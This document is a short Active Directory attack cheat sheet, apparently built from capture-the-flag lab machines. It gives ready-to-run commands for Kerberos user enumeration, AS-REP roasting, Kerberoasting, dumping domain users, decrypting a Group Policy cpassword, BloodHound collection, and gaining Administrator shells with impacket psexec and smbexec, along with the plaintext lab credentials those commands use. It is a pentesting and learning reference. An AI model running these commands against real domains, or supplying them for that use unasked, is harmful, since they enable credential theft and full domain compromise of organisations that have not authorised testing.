

#### User enumeration

- User bruteforce
```bash
 ~/opt/tools/kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt -o test

 impacket-GetNPUsers -dc-ip 10.10.218.91 -usersfile userlist.txt 'spookysec.local/'

```

1. KDC_ERR_C_PRINCIPAL_UNKNOWN ---> the user account don't available
2. UF_DONT_REQUIRE_PREAUTH ---> PreAuth required
3. With LDAPSerach we can get all account where PreAuth not enabled


- To dump all users, after getting one of the creds for the ldap
```bash
impacket-GetADUsers -dc-ip 'spookysec.local' -dc-host 'spookysec.local' -all 'spookysec.local/svc-admin:management2005'
```

- To dump all services SPN (+ Kerberoasting)
```bash
 impacket-GetUserSPNs -dc-ip 10.10.10.100 -dc-host active.htb 'active.htb/SVC_TGS:GPPstillStandingStrong2k18'
 
# For kerberoasting to TGS ticket hash use -request in the above command


## LDAP way to get user spn
ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(! (useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
```
 

#### Different Ways to get shell

```bash
impacket-smbexec -dc-ip 10.10.10.100 'active.htb/Administrator:Ticketmaster1968@10.10.10.100'

impacket-psexec 'active.htb/Administrator:Ticketmaster1968@10.10.10.100'
```

### Policies

- Able to get hands on a file known as group.xml with cpassword in it
  
```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```


### Blood Hound

```bash
 nxc ldap 10.10.218.91 -u backup -p backup2517860 --bloodhound --collection All --dns-server 10.10.218.91
```


#### Fixing clock skew

```bash
sudo timedatectl set-ntp off
sudo rdate -n 10.10.10.100
```